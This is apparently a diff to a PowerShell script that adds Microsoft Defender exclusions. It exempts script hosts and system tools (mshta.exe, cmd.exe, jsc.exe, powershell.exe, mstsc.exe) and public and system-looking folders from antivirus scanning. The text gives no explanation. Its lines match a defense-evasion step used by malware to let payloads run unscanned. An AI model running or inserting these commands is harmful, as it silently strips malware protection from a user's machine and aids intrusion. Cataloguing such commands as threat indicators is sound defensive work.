@@ -1,5 +1,17 @@
 Add-MpPreference -ExclusionProcess MSBuild.exe
-Add-MpPreference -ExclusionProcess powershell.exe
+Add-MpPreference -ExclusionProcess mshta.exe
 Add-MpPreference -ExclusionPath  C:\ProgramData\Google\
 Add-MpPreference -ExclusionPath  "%LocalAppData%\Microsoft\Windows\"
 Add-MpPreference -ExclusionPath  "%AppData%\Microsoft\Network\Connections\Pbk\"
+Add-MpPreference -ExclusionProcess mstsc.exe
+Add-MpPreference -ExclusionProcess cmd.exe
+Add-MpPreference -ExclusionProcess jsc.exe
+Add-MpPreference -ExclusionProcess rdpclip.exe
+Add-MpPreference -ExclusionProcess powershell.exe
+Add-MpPreference -ExclusionPath '%Public%\'
+Add-MpPreference -ExclusionPath 'C:\Users\Public\Music\'
+Add-MpPreference -ExclusionPath 'C:\Users\Public\'
+Add-MpPreference -ExclusionPath 'C:\Users\Public\\Pictures\'
+Add-MpPreference -ExclusionPath 'C:\Program Files\Common Files\Services\'
+Add-MpPreference -ExclusionPath 'C:\Program Files\Common Files\System\'
+Add-MpPreference -ExclusionPath '%LocalAppData%\Microsoft\Windows\'
